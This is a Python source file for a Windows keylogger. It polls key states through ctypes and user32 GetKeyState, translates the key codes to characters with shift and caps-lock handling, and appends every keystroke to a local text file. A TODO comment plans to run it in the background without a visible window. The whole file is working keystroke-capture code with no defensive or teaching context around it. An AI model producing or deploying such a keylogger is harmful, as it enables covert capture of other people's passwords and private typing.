from ctypes import *
import time

'''

ToDO:

    implement start/stop keylogging.
    Implement numpad (easy) + special character (difficult).
    Find a way to BG it on Windows without pythonw extansion. (Threading)

'''
controlDic = {}
controlDic[0x10] = "SHIFT"
controlDic[0x11] = "CTRL"
controlDic[0x12] = "ALT"
controlDic[0x14] = "CAPSLOCK"
controlDic[0x18] = "ESCAPE"


alphanumDic = {}
alphanumDic[0x08] = "\b"
alphanumDic[0x09] = "\t"
alphanumDic[0x0D] = "\n"
alphanumDic[0x10] = "SHIFT"
alphanumDic[0x11] = "CTRL"
alphanumDic[0x12] = "ALT"
alphanumDic[0x14] = "CAPSLOCK"
alphanumDic[0x18] = "ESCAPE"
alphanumDic[0x20] = " "
alphanumDic[0x30] = "0"
alphanumDic[0x31] = "1"
alphanumDic[0x32] = "2"
alphanumDic[0x33] = "3"
alphanumDic[0x34] = "4"
alphanumDic[0x35] = "5"
alphanumDic[0x36] = "6"
alphanumDic[0x37] = "7"
alphanumDic[0x38] = "8"
alphanumDic[0x39] = "9"
alphanumDic[0x41] = "a"
alphanumDic[0x42] = "b"
alphanumDic[0x43] = "c"
alphanumDic[0x44] = "d"
alphanumDic[0x45] = "e"
alphanumDic[0x46] = "f"
alphanumDic[0x47] = "g"
alphanumDic[0x48] = "h"
alphanumDic[0x49] = "i"
alphanumDic[0x4A] = "j"
alphanumDic[0x4B] = "k"
alphanumDic[0x4C] = "l"
alphanumDic[0x4D] = "m"
alphanumDic[0x4E] = "n"
alphanumDic[0x4F] = "o"
alphanumDic[0x50] = "p"
alphanumDic[0x51] = "q"
alphanumDic[0x52] = "r"
alphanumDic[0x53] = "s"
alphanumDic[0x54] = "t"
alphanumDic[0x55] = "u"
alphanumDic[0x56] = "v"
alphanumDic[0x57] = "w"
alphanumDic[0x58] = "x"
alphanumDic[0x59] = "y"
alphanumDic[0x5A] = "z"

shiftDic = {}
shiftDic[0x30] = ")"
shiftDic[0x31] = "!"
shiftDic[0x32] = "\""
shiftDic[0x33] = "£"
shiftDic[0x34] = "$"
shiftDic[0x35] = "%"
shiftDic[0x36] = "^"
shiftDic[0x37] = "&"
shiftDic[0x38] = "*"
shiftDic[0x39] = "("



keyActive = {}


class Keylogger:

    def __init__(self, keyActive, alphanumDic, shiftDic, controlDic):
        self.keyActive = keyActive
        self.alphanumDic = alphanumDic
        self.shiftDic = shiftDic
        self.controlDic = controlDic
        

    def keyPressed(self,x):
        '''return if the key is pressed or not 0 == not pressed, 1 == pressed'''
        return windll.user32.GetKeyState(c_int(x)) & 0x80

    def keyToggled(self,x):
        '''return if the key is toggled or not'''
        return windll.user32.GetKeyState(c_int(x)) & 0x01

    def keyCurrentlyActive(self):
        self.keyActive[self.key] = self.keyName

    def numToString(self):
        '''return Hex key to string '''
        return self.alphanumDic[self.key]
    
    def shiftNumToString(self):
        '''return shift Hex key to string '''
        return self.shiftDic[self.key]

    def checkShift(self):
        
        self.shiftTruth = False
        if self.keyPressed(0x10) != 0 and self.key in self.keyActive:
            self.shiftTruth = True

        return self.shiftTruth
        
    def _writeToFile(self, x):
        f = open("keyLogger.txt", 'a')
        f.write(x)
        f.close()
        return 0
        
    def keyTracking(self, key, keyName):
        self.key = key
        self.keyName = keyName
        if self.keyPressed(self.key) != 0 and self.key not in self.keyActive:
            
            self.keyCurrentlyActive()
            '''check if capslock is toggled or if shift is pressed'''
            if ((self.checkShift() == True or self.keyToggled(0x14) != 0) and self.key not in self.controlDic):

                try :
                    self.shiftNumToString()
                except:
                    self._writeToFile(self.numToString().upper())
                else:
                    self._writeToFile(self.shiftNumToString())

            elif self.checkShift() == False and self.key not in self.controlDic:
                self._writeToFile(self.numToString())
                
            else:
                '''pass to get the next character'''
                pass
        
                
        if self.keyPressed(self.key) == 0 and self.key in self.keyActive:       
            self.keyActive.pop(self.key)
        
            
if __name__ == "__main__":

    klog = Keylogger(keyActive, alphanumDic, shiftDic, controlDic)
                        
    while True:
        for key, keyName in alphanumDic.items():
            klog.keyTracking(key, keyName)
                
                
                
                    



        










    




















